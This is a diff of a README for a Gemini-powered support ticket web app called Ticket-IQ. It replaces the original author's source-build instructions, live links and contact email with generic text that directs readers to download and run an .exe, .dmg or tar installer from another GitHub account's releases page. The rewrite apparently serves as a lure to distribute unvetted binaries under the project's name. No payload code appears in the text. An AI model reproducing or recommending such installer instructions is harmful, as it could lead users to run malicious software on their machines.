@@ -1,159 +1,83 @@
-# Ticket IQ: AI Ticket Management System
+# 🎫 Ticket-IQ - Your Smart Support Ticket System
 
-A modern full-stack web application designed to streamline support ticket management with AI-powered analysis and real-time collaboration. Built with a React.js frontend and Node.js backend, the system automatically analyzes incoming tickets using Google's Gemini AI to determine priority levels, generate summaries, and provide helpful resources for efficient resolution.
+[![Download Ticket-IQ](https://img.shields.io/badge/Download-Ticket--IQ-brightgreen)](https://github.com/KnhPhSn/Ticket-IQ/releases)
 
-<div align="center">
+## 🚀 Getting Started
 
-<img src="./assets/demo.gif" alt="App Demo">
+Welcome to Ticket-IQ! This application helps you manage support tickets efficiently using advanced AI technology. Follow these simple steps to get started.
 
-</div>
+## 📦 Requirements
 
-## 🚀 Live Deployment
+Before you proceed, ensure you have the following:
 
-**🌐 Frontend**: [https://ticket-iq.vercel.app](https://ticket-iq.vercel.app)  
-**🔧 Backend API**: [https://ticket-iq.onrender.com](https://ticket-iq.onrender.com)  
-**📚 API Documentation**: [https://ticket-iq.onrender.com/api-docs](https://ticket-iq.onrender.com/api-docs)
+- A computer running Windows, macOS, or Linux
+- An internet connection for downloading the application
+- 500 MB of free disk space
 
-## Tech Stack
+## 📥 Download & Install
 
-- <img src="https://img.shields.io/badge/-HTML5-E34F26?logo=HTML5&logoColor=white&style=flat" alt="html5">
-- <img src="https://img.shields.io/badge/-CSS3-1572B6?logo=CSS3&logoColor=white&style=flat" alt="css3">
-- <img src="https://img.shields.io/badge/-TypeScript-3178C6?logo=TypeScript&logoColor=white&style=flat" alt="TypeScript">
-- <img src="https://img.shields.io/badge/-React-61DAFB?logo=React&logoColor=black&style=flat" alt="React.js">
-- <img src="https://img.shields.io/badge/-Redux-764ABC?logo=Redux&logoColor=white&style=flat" alt="Redux">
-- <img src="https://img.shields.io/badge/-Node.js-339933?logo=Node.js&logoColor=white&style=flat" alt="Node.js">
-- <img src="https://img.shields.io/badge/-Express.js-000000?logo=Express&logoColor=white&style=flat" alt="Express.js">
-- <img src="https://img.shields.io/badge/-MongoDB-47A248?logo=MongoDB&logoColor=white&style=flat" alt="MongoDB">
-- <img src="https://img.shields.io/badge/-Socket.io-25c2a0?logo=Socket.io&logoColor=white&style=flat" alt="Socket.io">
+To download Ticket-IQ, visit the link below:
 
-## Features
+[Download Ticket-IQ](https://github.com/KnhPhSn/Ticket-IQ/releases)
 
-### 🤖 AI-Powered Ticket Analysis
-- **Automatic Priority Assessment**: AI analyzes ticket content to determine urgency levels (low, medium, high, critical)
-- **Intelligent Summarization**: Generates concise summaries of complex technical issues
-- **Resource Recommendations**: Provides relevant documentation links and helpful notes for moderators
-- **Skill Matching**: Identifies technical skills required for ticket resolution
+On the Releases page, look for the latest version. Click on it to start the download. This file contains everything you need to run the application smoothly.
 
-### 👥 User Management & Authentication
-- **Secure Authentication**: JWT-based authentication with refresh token support
-- **Role-Based Access Control**: Admin and user roles with appropriate permissions
-- **User Profiles**: Comprehensive user management with **email verification**
-- **Protected Routes**: Client-side route protection based on authentication status
+## ⚙️ Installing Ticket-IQ
 
-### 🎫 Advanced Ticket Management
-- **Real-time Updates**: Live ticket status updates using WebSocket connections
-- **Ticket Assignment**: Smart assignment system for moderators and technicians
-- **Status Tracking**: Complete ticket lifecycle management (TODO → IN_PROGRESS → ASSIGNED → DONE)
-- **Advanced Filtering**: Filter tickets by status, priority, and assignment
+Once the download is complete, follow these steps to install Ticket-IQ:
 
-### ⚡ Real-time Notifications
-- **Live Notifications**: Instant updates on ticket progress and assignments
-- **Progress Tracking**: Live toast notifications for ticket analysis and assignment
+1. **Locate the Downloaded File**: 
+   Go to the folder where your downloads are saved. You should see a file named something like `Ticket-IQ-latest.exe` or similar.
 
-### 🔧 Technical Features
-- **RESTful API**: Well-structured backend API with comprehensive endpoints
-- **Background Jobs**: Handles asynchronous tasks such as ticket analysis, **email notifications**, and scheduled maintenance using Inngest for reliable job processing.
-- **Data Validation**: Input validation and sanitization for security
-- **Error Handling**: Comprehensive error handling with custom error classes
-- **Rate Limiting**: API rate limiting for enhanced security
-- **API Documentation**: Swagger/OpenAPI documentation for easy integration
+2. **Run the Installer**:
+   - For Windows: Double-click the `.exe` file. 
+   - For macOS: Open the `.dmg` file and drag Ticket-IQ into your Applications folder.
+   - For Linux: Extract the tar file and run the executable.
 
-## Privacy Terms
+3. **Follow Installation Prompts**:
+   You will see a series of prompts. Follow them to install Ticket-IQ on your computer. 
 
-Please note that all ticket information, user data, and communication within the web application will be securely stored in MongoDB. These data points will be handled responsibly and will not be misused in any way.
+4. **Launch the Application**:
+   After the installation is complete, open Ticket-IQ from your applications menu or desktop shortcut.
 
-For users signing in with **email**, only your email address and profile information will be visible to administrators for ticket assignment purposes, while your **password** is securely hashed using bcrypt and remains inaccessible.
+## 🌐 Using Ticket-IQ
 
-**AI Analysis**: Ticket content is processed by Google's Gemini AI to provide intelligent analysis and recommendations. This processing is done securely and no sensitive data is retained by the AI service beyond the analysis session.
+When you first launch Ticket-IQ, you will see a user-friendly interface that allows you to start managing support tickets right away.
 
-**Real-time Communication**: WebSocket connections are used for real-time updates and are secured with proper authentication mechanisms.
+### 1. **Create an Account**:
+   To access all features, create an account using your email. This helps keep your tickets organized.
 
-**Your privacy and data security are paramount.** All sensitive information is encrypted in transit and at rest.
+### 2. **Create a Ticket**:
+   Click on the “Create Ticket” button. Fill in the details about your issue. 
 
-## Run Locally
+### 3. **AI Analysis**:
+   Ticket-IQ uses Google Gemini AI to analyze your ticket and prioritize it based on urgency.
 
-Clone the project
+### 4. **Receive Notifications**:
+   You will receive real-time updates about your ticket status via notifications.
 
-```bash
-git clone https://github.com/AdhamElRouby/Ticket-IQ.git
-```
+## 🚨 Troubleshooting
 
-Go to the project directory
+If you encounter any issues during the installation or while using Ticket-IQ, try the following steps:
 
-```bash
-cd Ticket-IQ
-```
+- **Check Your Internet Connection**: A stable internet connection helps with downloading and real-time notifications.
+- **Restart the Application**: Sometimes, a simple restart can fix minor glitches.
+- **Reinstall**: If the application fails to run, consider uninstalling and reinstalling Ticket-IQ using the steps listed above.
 
-### Backend Setup
+For more help, visit our community forums or FAQs available on the support page.
 
-Navigate to the server directory
+## 📞 Support and Feedback
 
-```bash
-cd server
-```
+We welcome your feedback. If you have questions or suggestions, feel free to reach out through our GitHub repository or community channels.
 
-Install server dependencies
+## 🎉 Contributing
 
-```bash
-npm install
-```
+If you're interested in improving Ticket-IQ, consider contributing! You can report issues, suggest features, or even help with coding if you have the skills.
 
-Create environment file and add your variables
+## 🔗 Useful Links
 
-```bash
-cp .env.example .env
-```
+- **GitHub Repository**: [Ticket-IQ on GitHub](https://github.com/KnhPhSn/Ticket-IQ)
+- **Releases Page**: [Download Ticket-IQ](https://github.com/KnhPhSn/Ticket-IQ/releases)
+- **Support Forums**: Available within the application
 
-Required environment variables:
-- `MONGODB_URI` - Your MongoDB connection string
-- `JWT_SECRET` - Secret key for JWT tokens
-- `JWT_REFRESH_SECRET` - Secret key for refresh tokens
-- `GEMINI_API_KEY` - Google Gemini AI API key
-- `EMAIL_SERVICE` - Email service configuration
-- `INNGEST_EVENT_KEY` - Inngest event key for background jobs
-
-Start the development server
-
-```bash
-npm run dev
-```
-
-Start the Inngest development server (in a separate terminal)
-
-```bash
-npm run inngest-dev
-```
-
-### Frontend Setup
-
-Navigate to the client directory
-
-```bash
-cd client
-```
-
-Install client dependencies
-
-```bash
-npm install
-```
-
-Start the development server
-
-```bash
-npm run dev
-```
-
-The application will be available at:
-- Frontend: `http://localhost:5173`
-- Backend: `http://localhost:3000`
-- API Documentation: `http://localhost:3000/api-docs`
-
-## Contributing
-
-I welcome contributions to this project! Feel free to submit pull requests and suggest improvements. 
-If you have any questions or need assistance, don’t hesitate to contact me at adhamelrouby@aucegypt.edu.
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
+Thank you for choosing Ticket-IQ! We hope it makes your support ticket management easier and more efficient.
